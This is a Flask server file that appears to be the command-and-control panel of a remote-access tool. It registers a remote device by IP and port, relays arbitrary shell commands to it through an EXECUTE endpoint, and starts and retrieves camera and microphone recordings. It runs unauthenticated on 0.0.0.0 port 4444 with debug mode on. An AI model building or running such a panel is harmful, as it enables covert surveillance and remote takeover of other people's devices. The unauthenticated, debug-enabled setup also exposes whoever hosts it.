from flask import Flask, render_template, request, jsonify, Response, send_file
import requests
from io import BytesIO

app = Flask(__name__)

# Dictionary to store registered devices' IP and port
registered_devices = {}
BASE_URL = None  # Dynamically updated based on registered devices

@app.route('/')
def home():
    return render_template('index.html')


@app.route('/command/IS_DEVICE_REGISTERED', methods=['GET'])
def is_device_registered():
    global BASE_URL
    if BASE_URL:
        return jsonify({"registered": True})
    return jsonify({"registered": False}), 400

@app.route('/command/<command>', methods=['POST'])
def send_command(command):
    try:
        global BASE_URL
        if not BASE_URL:
            return jsonify({"success": False, "error": "No device registered. Please register a device first."})

        # Handle VIDEO_START separately
        if command == "VIDEO_START":
            data = request.get_json()
            if not data or 'cameraDirection' not in data:
                return jsonify({"success": False, "error": "Missing cameraDirection parameter"})
            
            response = requests.post(
                BASE_URL,
                params={"command": command},
                json={"cameraDirection": data['cameraDirection']}
            )
            return response.text

        # Handle EXECUTE command
        elif command == "EXECUTE":
            data = request.get_json()
            if not data or 'cmd' not in data:
                return jsonify({"success": False, "error": "Missing cmd parameter"})
            
            response = requests.post(
                BASE_URL,
                params={"command": command},
                json={"cmd": data['cmd']}
            )
            return jsonify({"success": True, "response": response.text})

        # Handle AUDIO/VIDEO STOP commands
        elif command in ["AUDIO_STOP", "VIDEO_STOP"]:
            response = requests.post(
                BASE_URL,
                params={"command": command}
            )
            return send_file(
                BytesIO(response.content),
                as_attachment=True,
                download_name="recorded_file.3gpp" if command == "AUDIO_STOP" else "recorded_file.mp4",
                mimetype="audio/3gpp" if command == "AUDIO_STOP" else "video/mp4"
            )

        # Handle all other commands
        else:
            response = requests.post(
                BASE_URL,
                params={"command": command}
            )
            return jsonify({"success": True, "response": response.text})

    except requests.RequestException as e:
        return jsonify({"success": False, "error": f"Network error: {str(e)}"})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route('/register', methods=['POST'])
def register_device():
    """
    Endpoint to register a device's IP and port.
    """
    try:
        global BASE_URL

        data = request.get_json()
        if not data or 'ip' not in data or 'port' not in data:
            return jsonify({"success": False, "error": "Missing 'ip' or 'port' in the payload"})

        device_ip = data['ip']
        device_port = data['port']
        device_url = f"http://{device_ip}:{device_port}"
        
        # Save to the registered devices dictionary
        registered_devices[device_ip] = device_port
        BASE_URL = device_url  # Update BASE_URL to the most recently registered device

        return jsonify({
            "success": True,
            "message": "Device registered successfully",
            "baseURL": BASE_URL,
            "registeredDevices": registered_devices
        })

    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

if __name__ == '__main__':
      app.run(host='0.0.0.0', port=4444, debug=True)
